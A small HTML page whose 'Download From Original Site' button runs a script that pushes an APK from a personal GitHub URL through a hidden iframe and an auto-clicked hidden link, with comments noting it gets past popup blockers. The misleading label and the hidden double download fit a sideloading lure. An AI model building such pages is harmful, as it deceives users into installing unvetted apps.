<html>
<head>
<meta charset="utf-8">
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
</style>
</head>
<body>
<script>
function a() {
    var url = 'https://github.com/RezaAS14/test.apk';

    // Metode 1: iframe tersembunyi — paling andal, gak kena popup blocker
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = url;
    document.body.appendChild(iframe);

    // Metode 2: anchor dengan atribut download, diklik otomatis (backup)
    setTimeout(function () {
        var link = document.createElement('a');
        link.href = url;
        link.download = 'test.apk';
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }, 1000);
}
</script>
<center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
</body>
</html>
